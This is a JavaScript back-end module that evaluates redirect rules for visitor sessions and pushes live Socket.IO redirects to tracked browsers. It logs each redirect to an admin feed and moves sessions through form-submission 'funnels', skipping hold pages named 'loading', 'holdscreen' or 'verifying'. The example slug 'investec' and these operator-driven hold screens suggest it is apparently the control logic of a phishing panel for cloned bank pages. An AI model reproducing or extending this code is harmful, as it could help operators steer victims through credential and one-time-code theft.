const { getAdapter } = require('../database/adapter');

/**
 * Evaluate redirect rules against a session, return the highest-priority match or null.
 *
 * @param {Object} session - The session object from the DB
 * @param {boolean} isAdminOnline - Whether an admin is currently connected
 * @returns {Promise<Object|null>} The matching redirect rule, or null
 */
async function evaluateRules(session, isAdminOnline) {
  const db = getAdapter();

  let rules;
  if (isAdminOnline) {
    rules = await db.all(`
      SELECT * FROM redirect_rules
      WHERE website_id = ? AND is_active = 1
      ORDER BY priority DESC
    `, [session.website_id]);
  } else {
    rules = await db.all(`
      SELECT * FROM redirect_rules
      WHERE website_id = ? AND is_active = 1 AND apply_when_offline = 1
      ORDER BY priority DESC
    `, [session.website_id]);
  }

  for (const rule of rules) {
    if (!_matchPattern(rule.source_pattern, session.current_page)) {
      continue;
    }

    if (!_matchConditions(rule.conditions, session)) {
      continue;
    }

    return rule;
  }

  return null;
}

/**
 * Execute a redirect: send Socket.IO event if available, log to DB, add to activity feed.
 *
 * @param {Object|null} io - The Socket.IO server instance (optional)
 * @param {string} sessionId - The session to redirect
 * @param {string} targetUrl - The URL to redirect to
 * @param {number|null} adminUserId - The admin user who triggered the redirect
 */
async function executeRedirect(io, sessionId, targetUrl, adminUserId) {
  const db = getAdapter();

  const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
  if (!session) return;

  // If the website is hosted on its own VPS/domain, strip the /<slug>/ prefix
  // so redirects work against the site's root (e.g. "/investec/error" → "/error").
  try {
    const website = await db.get('SELECT demo_slug, deploy_domain, domain, domain_active FROM websites WHERE id = ?', [session.website_id]);
    const hasOwnDomain = website && (website.deploy_domain || (website.domain && website.domain_active));
    if (hasOwnDomain && website.demo_slug) {
      const slug = website.demo_slug;
      const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const original = targetUrl;
      // Strip /demo/<slug>/ or /<slug>/ prefix
      targetUrl = targetUrl.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
      targetUrl = targetUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
      if (targetUrl !== original) {
        console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
      }
    }
  } catch {}

  if (io) {
    try {
      const trackerNsp = io.of('/tracker');
      trackerNsp.to(`session:${sessionId}`).emit('tracker:redirect', { url: targetUrl });
    } catch (e) {}
  }

  await db.run(`
    INSERT INTO redirect_commands (session_id, website_id, target_url, executed_by, executed_at)
    VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
  `, [sessionId, session.website_id, targetUrl, adminUserId || null]);

  const actionBy = adminUserId ? 'admin' : 'auto-rule';
  // Resolve the owner from the target website so the activity row lands in
  // the right client's feed (auto-rules don't have an adminUserId).
  let ownerId = null;
  try {
    const wOwner = await db.get('SELECT owner_id FROM websites WHERE id = ?', [session.website_id]);
    if (wOwner) ownerId = wOwner.owner_id;
  } catch {}
  if (ownerId != null) {
    await db.run(`
      INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id, session_id)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [
      ownerId,
      'redirect',
      '🔀',
      `Session redirected to ${targetUrl} (${actionBy})`,
      JSON.stringify({ target_url: targetUrl, executed_by: adminUserId }),
      session.website_id,
      sessionId
    ]);
  }

  if (io) {
    try {
      const adminNsp = io.of('/admin');
      const target = ownerId != null
        ? adminNsp.to(`user:${ownerId}`).to('god')
        : adminNsp.to('god');
      target.emit('admin:session-redirected', {
        sessionId,
        targetUrl,
        executedBy: adminUserId,
        timestamp: new Date().toISOString()
      });
    } catch (e) {}
  }
}

/**
 * Get all redirect rules with apply_when_offline enabled for a given website.
 */
async function getOfflineRules(websiteId) {
  const db = getAdapter();
  return await db.all(`
    SELECT * FROM redirect_rules
    WHERE website_id = ? AND is_active = 1 AND apply_when_offline = 1
    ORDER BY priority DESC
  `, [websiteId]);
}

function _matchPattern(pattern, url) {
  if (!pattern || pattern === '*') return true;
  if (!url) return false;

  const escaped = pattern
    .replace(/[.+?^${}()|[\]\\]/g, '\\$&')
    .replace(/\*/g, '.*');

  const regex = new RegExp(`^${escaped}$`, 'i');
  return regex.test(url);
}

function _matchConditions(conditionsStr, session) {
  if (!conditionsStr) return true;

  let conditions;
  try {
    conditions = typeof conditionsStr === 'string' ? JSON.parse(conditionsStr) : conditionsStr;
  } catch {
    return true;
  }

  if (!conditions || Object.keys(conditions).length === 0) return true;

  if (conditions.country && conditions.country.trim()) {
    const expected = conditions.country.toLowerCase().trim();
    const actual = (session.country || '').toLowerCase().trim();
    if (expected !== actual) return false;
  }

  if (conditions.device && conditions.device.trim()) {
    const expected = conditions.device.toLowerCase().trim();
    const actual = (session.device || '').toLowerCase().trim();
    if (expected !== actual) return false;
  }

  if (conditions.browser && conditions.browser.trim()) {
    const expected = conditions.browser.toLowerCase().trim();
    const actual = (session.browser || '').toLowerCase().trim();
    if (!actual.includes(expected)) return false;
  }

  if (conditions.referrer && conditions.referrer.trim()) {
    const actual = session.referrer || '';
    if (!_matchPattern(conditions.referrer.trim(), actual)) return false;
  }

  return true;
}

async function handleFunnelFormSubmit(io, sessionId, currentPageUrl) {
  const db = getAdapter();
  
  const session = await db.get('SELECT website_id, metadata FROM sessions WHERE id = ?', [sessionId]);
  if (!session) return;
  
  const funnel = await db.get('SELECT steps FROM funnels WHERE website_id = ? AND is_active = 1 LIMIT 1', [session.website_id]);
  if (!funnel) return;
  
  let steps = [];
  try { steps = typeof funnel.steps === 'string' ? JSON.parse(funnel.steps || '[]') : (funnel.steps || []); } catch { return; }
  
  const cleanPath = (url) => url.split('?')[0].replace(/\/$/, '').toLowerCase();
  const currentPath = cleanPath(currentPageUrl);
  
  const idx = steps.findIndex(s => cleanPath(s.url) === currentPath);
  if (idx === -1) return;

  let metadata = {};
  try { metadata = typeof session.metadata === 'string' ? JSON.parse(session.metadata || '{}') : (session.metadata || {}); } catch {}
  metadata.currentStepIndex = idx;
  await db.run('UPDATE sessions SET metadata = ? WHERE id = ?', [JSON.stringify(metadata), sessionId]);
  
  const nextStep = steps[idx + 1];
  if (nextStep && nextStep.url) {
    await executeRedirect(io, sessionId, nextStep.url, null);
  } else {
    const website = await db.get('SELECT demo_slug FROM websites WHERE id = ?', [session.website_id]);
    const slug = website && website.demo_slug ? website.demo_slug : 'demo';
    await executeRedirect(io, sessionId, `/demo/${slug}/loading`, null);
  }
}

async function advanceFunnel(io, sessionId) {
  const db = getAdapter();
  
  const session = await db.get('SELECT website_id, current_page, metadata FROM sessions WHERE id = ?', [sessionId]);
  if (!session) return null;
  
  const funnel = await db.get('SELECT steps FROM funnels WHERE website_id = ? AND is_active = 1 LIMIT 1', [session.website_id]);
  if (!funnel) return null;
  
  let steps = [];
  try { steps = typeof funnel.steps === 'string' ? JSON.parse(funnel.steps || '[]') : (funnel.steps || []); } catch { return null; }
  
  let metadata = {};
  try { metadata = typeof session.metadata === 'string' ? JSON.parse(session.metadata || '{}') : (session.metadata || {}); } catch {}
  
  let currentIdx = -1;
  if (metadata.hasOwnProperty('currentStepIndex')) {
    currentIdx = parseInt(metadata.currentStepIndex, 10);
  } else {
    const cleanPath = (url) => url.split('?')[0].replace(/\/$/, '').toLowerCase();
    const currentPath = cleanPath(session.current_page || '');
    currentIdx = steps.findIndex(s => cleanPath(s.url) === currentPath);
  }
  
  let nextIdx = currentIdx + 1;
  while (nextIdx < steps.length) {
    const nextStep = steps[nextIdx];
    const cleanStepUrl = (nextStep.url || '').split('?')[0].replace(/\/$/, '').toLowerCase();
    const pageObj = await db.get('SELECT form_type FROM demo_pages WHERE website_id = ? AND (LOWER(url) = ? OR LOWER(url) = ?)', [session.website_id, cleanStepUrl, cleanStepUrl.split('/').pop()]);
    const isStepLoading = (pageObj && pageObj.form_type === 'loading') || 
                          cleanStepUrl.includes('/loading') || 
                          /^(loading|loader|wait|waiting|hold|holdscreen|please[-_]?wait|standby|processing|verifying)(.html)?$/.test(cleanStepUrl.split('/').pop());
    if (isStepLoading) {
      nextIdx++;
    } else {
      break;
    }
  }
  
  const nextStep = steps[nextIdx];
  if (nextStep) {
    metadata.currentStepIndex = nextIdx;
    await db.run('UPDATE sessions SET metadata = ? WHERE id = ?', [JSON.stringify(metadata), sessionId]);

    await executeRedirect(io, sessionId, nextStep.url, null);
    return nextStep.url;
  }
  return null;
}

module.exports = {
  evaluateRules,
  executeRedirect,
  getOfflineRules,
  handleFunnelFormSubmit,
  advanceFunnel
};
